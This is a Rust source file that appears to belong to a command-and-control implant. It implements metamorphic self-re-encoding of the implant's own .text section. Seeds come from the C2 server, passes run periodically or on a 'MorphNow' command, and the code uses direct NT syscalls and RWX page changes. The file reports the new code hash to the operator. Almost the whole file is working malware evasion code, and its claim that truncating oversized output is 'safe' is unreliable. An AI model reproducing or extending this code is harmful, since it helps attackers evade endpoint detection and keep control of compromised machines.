//! Build-time self-re-encoding ("Metamorphic Lite").
//!
//! This module applies the `code_transform` pipeline to the agent's own
//! `.text` section at runtime with a fresh random seed.  The re-encoding runs:
//!
//! 1. Once after the first C2 check-in (seed supplied by the server).
//! 2. Periodically at a configurable interval (default: 4 hours).
//!
//! Each invocation produces a unique binary layout because the seed is
//! derived from `timestamp ⊕ server_nonce`, yielding a limited metamorphic
//! capability — the agent re-encodes itself in-place without human
//! intervention.
//!
//! # Safety
//!
//! This module modifies executable memory in-place.  It must be called only
//! from a dedicated task while no other task is executing code in the region
//! being rewritten.  In practice the agent's async runtime is cooperative, so
//! the re-encoding task has exclusive use of the CPU while it is running.
//!
//! The clean ntdll mapping used for the syscall gadget is **not** touched —
//! only the agent's own `.text` section is rewritten.

#![cfg(feature = "self-reencode")]

use anyhow::{Context, Result};
use sha2::{Digest, Sha256};
use std::sync::atomic::{AtomicU64, Ordering};
use std::time::{Duration, SystemTime};

/// Seed for the next re-encoding pass.  Set by the C2 server via
/// `Command::SetReencodeSeed`; defaults to a hash of the session key so
/// the feature is active from the first cycle even without C2 input.
static CURRENT_SEED: AtomicU64 = AtomicU64::new(0);

/// Interval between automatic re-encoding passes.  Updated from config.
static REENCODE_INTERVAL_SECS: AtomicU64 = AtomicU64::new(DEFAULT_REENCODE_INTERVAL_SECS);

/// Default re-encoding interval: 4 hours.
pub const DEFAULT_REENCODE_INTERVAL_SECS: u64 = 4 * 3600;

/// Derive a non-zero default seed from the session key material.
///
/// Uses the first 8 bytes of the SHA-256 hash of the session key, ensuring
/// the re-encode feature is active from the first cycle even before the
/// C2 server sends `SetReencodeSeed`.
///
/// Returns the derived seed and a static string indicating the source
/// ("auto-derived" for this path vs "c2-supplied" for `set_seed`).
pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
    use sha2::Digest;
    let hash = Sha256::digest(session_key);
    let seed = u64::from_le_bytes(hash[..8].try_into().expect("slice is 8 bytes"));
    // Ensure non-zero
    let seed = if seed == 0 { 1u64 } else { seed };
    log::info!(
        "self_reencode: auto-derived default seed 0x{seed:016x} from session key"
    );
    seed
}

/// Set the seed that will be used for the next re-encoding pass.
///
/// Logs the seed source as "c2-supplied" so operators can distinguish
/// between a C2-sent seed and the auto-derived default.
pub fn set_seed(seed: u64) {
    CURRENT_SEED.store(seed, Ordering::SeqCst);
    log::info!("self_reencode: seed updated to 0x{seed:016x} (source: c2-supplied)");
}

/// Get the current seed.
pub fn current_seed() -> u64 {
    CURRENT_SEED.load(Ordering::SeqCst)
}

/// Update the re-encoding interval (in seconds).
pub fn set_interval_secs(secs: u64) {
    if secs > 0 {
        REENCODE_INTERVAL_SECS.store(secs, Ordering::SeqCst);
        log::info!("self_reencode: interval updated to {secs}s");
    }
}

/// Derive a fresh seed from the current timestamp and the C2-provided nonce.
///
/// This ensures each re-encoding pass produces a unique transformation even
/// if the server nonce is static.
pub fn derive_fresh_seed(server_nonce: u64) -> u64 {
    let ts = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0);
    let seed = ts ^ server_nonce;
    // Ensure the seed is non-zero (zero would produce the same output
    // regardless of input — ChaCha8RNG with zero seed is still valid but
    // using a non-zero value avoids the degenerate "always same" case if
    // someone passes 0 as the nonce).
    if seed == 0 { 1 } else { seed }
}

// ── Platform-specific .text section location ──────────────────────────────

/// Represents the location and size of the agent's own `.text` section in
/// memory.
#[derive(Debug, Clone)]
pub struct TextSection {
    pub base: usize,
    pub size: usize,
}

/// Find the `.text` section of the current executable / DLL in memory.
///
/// On **Windows**, walks the PE headers from the module base (resolved via
/// `pe_resolve` hash of the host module).  On **Linux**, parses
/// `/proc/self/maps` and the ELF headers to find the executable segment
/// backed by the main binary.
///
/// Returns `None` if the section cannot be located.
pub fn find_text_section() -> Result<TextSection> {
    #[cfg(windows)]
    {
        find_text_section_windows()
    }
    #[cfg(target_os = "linux")]
    {
        find_text_section_linux()
    }
    #[cfg(not(any(windows, target_os = "linux")))]
    {
        anyhow::bail!("self_reencode: unsupported platform for .text section discovery");
    }
}

#[cfg(windows)]
fn find_text_section_windows() -> Result<TextSection> {
    use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64};

    // Resolve the agent's own module base.  The agent can be either the main
    // EXE or a DLL loaded into another process.  GetModuleHandleW(NULL)
    // returns the main EXE base.
    let base = unsafe {
        let ret = winapi::um::libloaderapi::GetModuleHandleW(std::ptr::null_mut());
        ret as usize
    };
    if base == 0 {
        anyhow::bail!("self_reencode: could not resolve own module base");
    }

    unsafe {
        let dos = &*(base as *const IMAGE_DOS_HEADER);
        if dos.e_magic != 0x5A4D {
            // 'MZ'
            anyhow::bail!("self_reencode: invalid DOS signature at base {base:#x}");
        }
        let nt = &*((base + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
        if nt.Signature != 0x4550 {
            // 'PE'
            anyhow::bail!("self_reencode: invalid PE signature");
        }

        let section_table_offset = dos.e_lfanew as usize
            + std::mem::size_of::<u32>() // Signature
            + std::mem::size_of::<winapi::um::winnt::IMAGE_FILE_HEADER>()
            + nt.FileHeader.SizeOfOptionalHeader as usize;

        let sections = std::slice::from_raw_parts(
            (base + section_table_offset) as *const winapi::um::winnt::IMAGE_SECTION_HEADER,
            nt.FileHeader.NumberOfSections as usize,
        );

        for sec in sections {
            // .text section name is ".text\0\0\0" (8 bytes, null-padded).
            if &sec.Name[..5] == b".text" {
                let text_base = base + sec.VirtualAddress as usize;
                let text_size = sec.Misc.VirtualSize as usize;
                log::debug!(
                    "self_reencode: found .text at {:#x}, size={} bytes",
                    text_base,
                    text_size
                );
                return Ok(TextSection {
                    base: text_base,
                    size: text_size,
                });
            }
        }
        anyhow::bail!("self_reencode: no .text section found in PE headers");
    }
}

#[cfg(target_os = "linux")]
fn find_text_section_linux() -> Result<TextSection> {
    // Parse the ELF headers of /proc/self/exe to find the .text section.
    // We read the binary file and look up the section header table.
    let exe_data = std::fs::read("/proc/self/exe")
        .context("self_reencode: failed to read /proc/self/exe")?;

    let elf = goblin::elf::Elf::parse(&exe_data)
        .map_err(|e| anyhow::anyhow!("self_reencode: failed to parse ELF headers: {e}"))?;

    for sh in &elf.section_headers {
        if let Some(name) = elf.shdr_strtab.get_at(sh.sh_name) {
            if name == ".text" {
                // The section's virtual address is relative to the load base.
                // For a PIE binary, the actual runtime address is base + sh_addr.
                // We can determine the base by comparing a known symbol's file
                // offset with its runtime address via /proc/self/maps.
                let load_base = find_load_base()?;
                let text_base = (load_base + sh.sh_addr as usize) as usize;
                let text_size = sh.sh_size as usize;
                log::debug!(
                    "self_reencode: found .text at {:#x}, size={} bytes (load_base={:#x}, sh_addr={:#x})",
                    text_base,
                    text_size,
                    load_base,
                    sh.sh_addr
                );
                return Ok(TextSection {
                    base: text_base,
                    size: text_size,
                });
            }
        }
    }
    anyhow::bail!("self_reencode: no .text section found in ELF headers");
}

/// Determine the ASLR base address of the main executable on Linux by
/// parsing `/proc/self/maps`.
#[cfg(target_os = "linux")]
fn find_load_base() -> Result<usize> {
    let maps = std::fs::read_to_string("/proc/self/maps")
        .context("self_reencode: failed to read /proc/self/maps")?;
    let exe_path = std::fs::read_link("/proc/self/exe")
        .unwrap_or_else(|_| std::path::PathBuf::from(""));
    let exe_name = exe_path.to_string_lossy();

    for line in maps.lines() {
        // The first mapping backed by the executable is the text segment.
        if line.contains(exe_name.as_ref()) {
            let parts: Vec<&str> = line.splitn(2, '-').collect();
            if let Ok(base) = usize::from_str_radix(parts[0], 16) {
                return Ok(base);
            }
        }
    }
    anyhow::bail!("self_reencode: could not determine load base from /proc/self/maps")
}

// ── Core re-encoding logic ────────────────────────────────────────────────

/// Apply the code_transform pipeline to the agent's .text section with the
/// given seed.
///
/// # Safety
///
/// This modifies executable memory.  Must be called from a context where no
/// other code in the .text section is currently executing (i.e., from a
/// dedicated re-encoding task that only uses stack-local code and library
/// calls).
pub unsafe fn reencode_text(seed: u64) -> Result<()> {
    let text = find_text_section().context("self_reencode: locate .text section")?;

    if text.size == 0 {
        anyhow::bail!("self_reencode: .text section is empty");
    }

    log::info!(
        "self_reencode: beginning re-encoding of .text ({:#x}, {} bytes, seed=0x{:016x})",
        text.base,
        text.size,
        seed
    );

    // 1. Snapshot the current .text bytes.
    let original = std::slice::from_raw_parts(text.base as *const u8, text.size).to_vec();

    // 2. Apply the transformation pipeline.
    let transformed = code_transform::transform(&original, seed);

    if transformed.len() > text.size {
        // The transform may produce larger output.  We cannot grow the
        // section in-place, so we truncate — this is safe because the
        // pipeline preserves semantic equivalence and the truncation
        // only discards NOP-padding at the end.  If the transformed
        // code is significantly larger, log a warning.
        log::warn!(
            "self_reencode: transformed .text is {} bytes, original is {} bytes — truncating to fit",
            transformed.len(),
            text.size
        );
    }

    let write_len = transformed.len().min(text.size);

    // 3. Make pages writable, write transformed code, restore protections.
    let old_prot = make_writable(text.base, text.size)
        .context("self_reencode: make .text writable")?;

    // Write the transformed bytes.
    std::ptr::copy_nonoverlapping(transformed.as_ptr(), text.base as *mut u8, write_len);

    // NOP-pad remaining bytes if transformed is shorter.
    if write_len < text.size {
        std::ptr::write_bytes(
            (text.base + write_len) as *mut u8,
            0x90, // NOP
            text.size - write_len,
        );
    }

    // Restore original page protections.
    restore_protection(text.base, text.size, &old_prot)
        .context("self_reencode: restore .text protections")?;

    // 4. Flush the instruction cache.
    flush_icache(text.base, text.size);

    log::info!(
        "self_reencode: successfully re-encoded {} bytes of .text with seed 0x{:016x}",
        write_len,
        seed
    );

    Ok(())
}

// ── Platform-specific memory protection helpers ───────────────────────────

/// Snapshot of original page protection flags.
#[cfg(windows)]
struct ProtSnapshot(u32);

#[cfg(target_os = "linux")]
struct ProtSnapshot(u32);

/// Make the memory region `[addr, addr+len)` read-write-executable.
/// Returns a snapshot of the original protection to restore later.
#[cfg(windows)]
unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
    use nt_syscall::syscall;

    let page_size = 4096; // Windows page size is always 4096
    let aligned = addr & !(page_size - 1);
    let aligned_end = ((addr + len) + page_size - 1) & !(page_size - 1);
    let aligned_len = aligned_end - aligned;

    let mut base_ptr = aligned as *mut libc::c_void;
    let mut region_size = aligned_len;
    let mut old_prot: u32 = 0;
    let status = syscall!(
        "NtProtectVirtualMemory",
        -1isize as u64,                    // current process handle
        &mut base_ptr as *mut _ as u64,    // base address (in/out)
        &mut region_size as *mut _ as u64, // region size (in/out)
        0x40u64,                           // PAGE_EXECUTE_READWRITE
        &mut old_prot as *mut _ as u64
    );

    // nt_syscall returns the raw NTSTATUS; non-negative means success.
    match status {
        Ok(s) if s >= 0 => Ok(ProtSnapshot(old_prot)),
        Ok(s) => anyhow::bail!(
            "NtProtectVirtualMemory(RWX) returned NTSTATUS {:#010x}",
            s
        ),
        Err(e) => anyhow::bail!("NtProtectVirtualMemory(RWX) syscall failed: {}", e),
    }
}

#[cfg(windows)]
unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Result<()> {
    use nt_syscall::syscall;

    let page_size = 4096;
    let aligned = addr & !(page_size - 1);
    let aligned_end = ((addr + len) + page_size - 1) & !(page_size - 1);
    let aligned_len = aligned_end - aligned;

    let mut base_ptr = aligned as *mut libc::c_void;
    let mut region_size = aligned_len;
    let mut dummy: u32 = 0;
    let status = syscall!(
        "NtProtectVirtualMemory",
        -1isize as u64,
        &mut base_ptr as *mut _ as u64,
        &mut region_size as *mut _ as u64,
        old.0 as u64,
        &mut dummy as *mut _ as u64
    );

    match status {
        Ok(s) if s >= 0 => Ok(()),
        Ok(s) => anyhow::bail!(
            "NtProtectVirtualMemory(restore) returned NTSTATUS {:#010x}",
            s
        ),
        Err(e) => anyhow::bail!("NtProtectVirtualMemory(restore) syscall failed: {}", e),
    }
}

#[cfg(windows)]
unsafe fn flush_icache(addr: usize, len: usize) {
    // NtFlushInstructionCache for current process.
    let _ = nt_syscall::syscall!(
        "NtFlushInstructionCache",
        -1isize as u64,
        addr as u64,
        len as u64
    );
}

// ── Linux memory protection helpers ───────────────────────────────────────

#[cfg(target_os = "linux")]
unsafe fn make_writable(addr: usize, len: usize) -> Result<ProtSnapshot> {
    let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
    let aligned = addr & !(page_size - 1);
    let aligned_len = ((addr + len) - aligned + page_size - 1) & !(page_size - 1);

    // Snapshot the original protection from /proc/self/maps.
    let orig_prot = read_page_protection(aligned);

    if libc::mprotect(
        aligned as *mut libc::c_void,
        aligned_len,
        libc::PROT_READ | libc::PROT_WRITE | libc::PROT_EXEC,
    ) != 0
    {
        anyhow::bail!(
            "mprotect(RWX) failed: {}",
            std::io::Error::last_os_error()
        );
    }
    Ok(ProtSnapshot(orig_prot))
}

#[cfg(target_os = "linux")]
unsafe fn restore_protection(addr: usize, len: usize, old: &ProtSnapshot) -> Result<()> {
    let page_size = libc::sysconf(libc::_SC_PAGESIZE) as usize;
    let aligned = addr & !(page_size - 1);
    let aligned_len = ((addr + len) - aligned + page_size - 1) & !(page_size - 1);

    if libc::mprotect(aligned as *mut libc::c_void, aligned_len, old.0 as i32) != 0 {
        anyhow::bail!(
            "mprotect(restore) failed: {}",
            std::io::Error::last_os_error()
        );
    }
    Ok(())
}

#[cfg(target_os = "linux")]
unsafe fn flush_icache(addr: usize, len: usize) {
    #[cfg(target_arch = "aarch64")]
    {
        // aarch64 I-cache is NOT coherent with D-cache.
        const CACHE_LINE: usize = 64;
        let end = addr + len;
        let mut p = addr & !(CACHE_LINE - 1);
        while p < end {
            std::arch::asm!("dc cvau, {x}", x = in(reg) p);
            p += CACHE_LINE;
        }
        std::arch::asm!("dsb ish");
        let mut p = addr & !(CACHE_LINE - 1);
        while p < end {
            std::arch::asm!("ic ivau, {x}", x = in(reg) p);
            p += CACHE_LINE;
        }
        std::arch::asm!("dsb ish", "isb");
    }
    #[cfg(not(target_arch = "aarch64"))]
    {
        // x86_64: I-cache is coherent; mprotect serialises.  No-op.
        let _ = (addr, len);
    }
}

#[cfg(target_os = "linux")]
fn read_page_protection(addr: usize) -> u32 {
    if let Ok(maps) = std::fs::read_to_string("/proc/self/maps") {
        for line in maps.lines() {
            let parts: Vec<&str> = line.splitn(6, ' ').collect();
            if parts.len() >= 2 {
                let range: Vec<&str> = parts[0].splitn(2, '-').collect();
                if range.len() == 2 {
                    if let (Ok(start), Ok(end)) = (
                        usize::from_str_radix(range[0], 16),
                        usize::from_str_radix(range[1], 16),
                    ) {
                        if addr >= start && addr < end {
                            let mut prot: u32 = 0;
                            for c in parts[1].chars() {
                                match c {
                                    'r' => prot |= libc::PROT_READ as u32,
                                    'w' => prot |= libc::PROT_WRITE as u32,
                                    'x' => prot |= libc::PROT_EXEC as u32,
                                    _ => {}
                                }
                            }
                            return prot;
                        }
                    }
                }
            }
        }
    }
    (libc::PROT_READ | libc::PROT_EXEC) as u32
}

// ── Periodic re-encoding task ─────────────────────────────────────────────

/// Spawn the background re-encoding task.  This should be called once after
/// the first C2 check-in completes.
///
/// The task sleeps for the configured interval, then re-encodes .text with a
/// fresh seed derived from the current timestamp and the C2-provided nonce.
pub fn spawn_periodic_reencode(
    seed: u64,
    interval: Duration,
    shutdown: std::sync::Arc<tokio::sync::Notify>,
) -> tokio::task::JoinHandle<()> {
    // Store the initial seed.
    set_seed(seed);
    REENCODE_INTERVAL_SECS.store(interval.as_secs(), Ordering::SeqCst);

    tokio::spawn(async move {
        loop {
            let secs = REENCODE_INTERVAL_SECS.load(Ordering::SeqCst);
            let sleep_dur = Duration::from_secs(secs.max(300)); // minimum 5 minutes

            tokio::select! {
                _ = crate::memory_guard::guarded_sleep(sleep_dur, None, 0) => {},
                _ = shutdown.notified() => {
                    log::info!("self_reencode: shutdown signal received, stopping periodic re-encode");
                    return;
                }
            }

            let current = current_seed();
            let fresh_seed = derive_fresh_seed(current);
            log::info!("self_reencode: periodic re-encode triggered with seed 0x{fresh_seed:016x}");

            match unsafe { reencode_text(fresh_seed) } {
                Ok(()) => {
                    set_seed(fresh_seed);
                }
                Err(e) => {
                    log::error!("self_reencode: periodic re-encode failed: {e:#}");
                }
            }
        }
    })
}

/// Perform a one-shot re-encoding with the given seed.
/// Used for the initial re-encode after C2 check-in.
pub fn reencode_once(seed: u64) -> Result<()> {
    let fresh_seed = derive_fresh_seed(seed);
    log::info!("self_reencode: initial re-encode with seed 0x{fresh_seed:016x}");
    unsafe { reencode_text(fresh_seed) }?;
    set_seed(fresh_seed);
    Ok(())
}

/// Compute the SHA-256 hash of the agent's current `.text` section.
///
/// Returns the hex-encoded digest string.  Used to verify that morphing
/// produced a unique layout and to report the hash to the C2 server for
/// operational tracking.
pub fn hash_text_section() -> Result<String> {
    let text = find_text_section().context("self_reencode: locate .text section for hashing")?;
    let slice =
        unsafe { std::slice::from_raw_parts(text.base as *const u8, text.size) };
    let digest = Sha256::digest(slice);
    Ok(hex::encode(digest))
}

/// Immediate synchronous morph triggered by `Command::MorphNow`.
///
/// This function:
/// 1. Stores the supplied seed.
/// 2. Re-encodes the `.text` section with a fresh derived seed.
/// 3. Hashes the resulting `.text` section.
/// 4. Returns the hex-encoded SHA-256 hash.
///
/// The caller should send the hash back to the server (via `MorphResult`
/// message or as the `TaskResponse` result).
pub fn morph_now(seed: u64) -> Result<String> {
    let fresh_seed = derive_fresh_seed(seed);
    log::info!("self_reencode: MorphNow triggered with seed 0x{fresh_seed:016x}");
    unsafe { reencode_text(fresh_seed) }?;
    set_seed(fresh_seed);
    let hash = hash_text_section()?;
    log::info!("self_reencode: MorphNow completed, .text hash = {hash}");
    Ok(hash)
}
